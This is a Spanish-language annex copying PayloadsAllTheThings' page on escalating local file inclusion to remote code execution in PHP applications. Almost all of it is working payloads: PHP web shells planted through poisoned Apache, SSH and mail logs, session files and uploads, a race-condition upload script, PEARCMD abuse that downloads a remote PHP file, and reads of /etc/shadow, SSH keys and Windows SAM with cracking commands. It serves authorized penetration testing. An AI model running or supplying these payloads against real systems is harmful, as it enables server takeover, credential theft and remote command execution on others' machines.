# Path Traversal y LFI: anexo de ejemplos de PayloadsAllTheThings

> **Uso:** elegir el bloque que corresponde al motor, versión y punto de entrada. Las líneas de un bloque pueden ser alternativas. Sustituir hosts, rutas, identificadores y dominios por los del laboratorio o alcance autorizado. Los ejemplos originales son referencias de sintaxis, no pruebas verificadas contra el objetivo.

**Documento de origen:** [File Inclusion/LFI-to-RCE.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/File%20Inclusion/LFI-to-RCE.md), revisión fija 3ac27901c711. **Licencia:** [MIT de Swissky](../../LICENCIA_PATT.md).

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md)

## 1. LFI to RCE / LFI to RCE via /proc/*/fd

```ps1
http://example.com/index.php?page=/proc/$PID/fd/$FD
```

### Variantes presentes en tablas o texto del apartado

```text
/proc/$PID/fd/$FD
$PID
$FD
```

## 2. LFI to RCE / LFI to RCE via /proc/self/environ

```powershell
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```

### Variantes presentes en tablas o texto del apartado

```text
User-Agent
/proc/self/environ
```

## 3. LFI to RCE / LFI to RCE via iconv

### Variantes presentes en tablas o texto del apartado

```text
/proc/self/maps
zend_mm_heap
free()
custom_heap._free
convert.iconv
zlib.inflate
```

## 4. LFI to RCE / LFI to RCE via upload

```powershell
http://example.com/index.php?page=path/to/uploaded/file.png
```

### Variantes presentes en tablas o texto del apartado

```text
<?php system($_GET['c']); ?>
```

## 5. LFI to RCE / LFI to RCE via upload (race)

```python
import itertools
import requests
import sys

print('[+] Trying to win the race')
f = {'file': open('shell.php', 'rb')}
for _ in range(4096 * 4096):
    requests.post('http://target.com/index.php?c=index.php', f)


print('[+] Bruteforcing the inclusion')
for fname in itertools.combinations(string.ascii_letters + string.digits, 6):
    url = 'http://target.com/index.php?c=/tmp/php' + fname
    r = requests.get(url)
    if 'load average' in r.text:  # <?php echo system('uptime');
        print('[+] We have got a shell: ' + url)
        sys.exit(0)

print('[x] Something went wrong, please try again')
```

## 6. LFI to RCE / LFI to RCE via upload (FindFirstFile)

### Variantes presentes en tablas o texto del apartado

```text
<<
*
>
?
C:\Windows\Temp\
php[A-F0-9]{4}.tmp
http://site/vuln.php?inc=c:\windows\temp\php<<
```

## 7. LFI to RCE / LFI to RCE via controlled log Archivo

```powershell
http://example.com/index.php?page=/var/log/apache/access.log
http://example.com/index.php?page=/var/log/apache/error.log
http://example.com/index.php?page=/var/log/apache2/access.log
http://example.com/index.php?page=/var/log/apache2/error.log
http://example.com/index.php?page=/var/log/nginx/access.log
http://example.com/index.php?page=/var/log/nginx/error.log
http://example.com/index.php?page=/var/log/vsftpd.log
http://example.com/index.php?page=/var/log/sshd.log
http://example.com/index.php?page=/var/log/mail
http://example.com/index.php?page=/var/log/httpd/error_log
http://example.com/index.php?page=/usr/local/apache/log/error_log
http://example.com/index.php?page=/usr/local/apache2/log/error_log
```

## 8. LFI to RCE via controlled log Archivo / RCE via SSH

```powershell
ssh <?php system($_GET["cmd"]);?>@10.10.10.10
```

```powershell
http://example.com/index.php?page=/var/log/auth.log&cmd=id
```

### Variantes presentes en tablas o texto del apartado

```text
<?php system($_GET["cmd"]);?>
```

## 9. LFI to RCE via controlled log Archivo / RCE via Mail

```powershell
root@kali:~# telnet 10.10.10.10. 25
Trying 10.10.10.10....
Connected to 10.10.10.10..
Escape character is '^]'.
220 straylight ESMTP Postfix (Debian/GNU)
helo ok
250 straylight
mail from: mail@example.com
250 2.1.0 Ok
rcpt to: root
250 2.1.5 Ok
data
354 End data with <CR><LF>.<CR><LF>
subject: <?php echo system($_GET["cmd"]); ?>
data2
.
```

```powershell
mail -s "<?php system($_GET['cmd']);?>" www-data@10.10.10.10. < /dev/null
```

### Variantes presentes en tablas o texto del apartado

```text
http://example.com/index.php?page=/var/log/mail
```

## 10. LFI to RCE via controlled log Archivo / RCE via Apache logs

```ps1
curl http://example.org/ -A "<?php system(\$_GET['cmd']);?>"
```

```ps1
curl http://example.org/test.php?page=/var/log/apache2/access.log&cmd=id
```

## 11. LFI to RCE / LFI to RCE via PHP sessions

```javascript
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```

```javascript
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```

```powershell
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```

```powershell
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27
```

### Variantes presentes en tablas o texto del apartado

```text
<?php system('cat /etc/passwd');?>
```

## 12. LFI to RCE / LFI to RCE via PHP PEARCMD

```ini
register_argc_argv = On
```

```ps1
  /vuln.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=eval($_GET['cmd'])?>+/tmp/exec.php
  /vuln.php?file=/tmp/exec.php&cmd=phpinfo();die();
```

```ps1
  /vuln.php?file=/usr/local/lib/php/pearcmd.php&+-c+/tmp/exec.php+-d+man_dir=<?echo(system($_GET['c']));?>+-s+
  /vuln.php?file=/tmp/exec.php&c=id
```

```php
  #PEAR_Config 0.9
  a:2:{s:10:"__channels";a:2:{s:12:"pecl.php.net";a:0:{}s:5:"__uri";a:0:{}}s:7:"man_dir";s:29:"<?echo(system($_GET['c']));?>";}
```

```ps1
  /vuln.php?file=/usr/local/lib/php/pearcmd.php&+download+http://<ip>:<port>/exec.php
  /vuln.php?file=exec.php&c=id
```

```ps1
  /vuln.php?file=/usr/local/lib/php/pearcmd.php&+install+http://<ip>:<port>/exec.php
  /vuln.php?file=/tmp/pear/download/exec.php&c=id
```

### Variantes presentes en tablas o texto del apartado

```text
pearcmd.php
/usr/local/lib/php/pearcmd.php
$_SERVER['argv']
register_argc_argv
php.ini
exec.php
/tmp/pear/download/exec.php
```

## 13. LFI to RCE via credentials Archivos / Windows version

```powershell
http://example.com/index.php?page=../../../../../../WINDOWS/repair/sam
http://example.com/index.php?page=../../../../../../WINDOWS/repair/system
```

### Variantes presentes en tablas o texto del apartado

```text
samdump2 SYSTEM SAM > hashes.txt
hashcat/john
```

## 14. LFI to RCE via credentials Archivos / Linux version

```powershell
http://example.com/index.php?page=../../../../../../etc/shadow
```

### Variantes presentes en tablas o texto del apartado

```text
/etc/shadow
id_rsa
/etc/passwd
/<HOME>/.ssh/id_rsa
```

---

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md) · [Licencia de origen](../../LICENCIA_PATT.md)
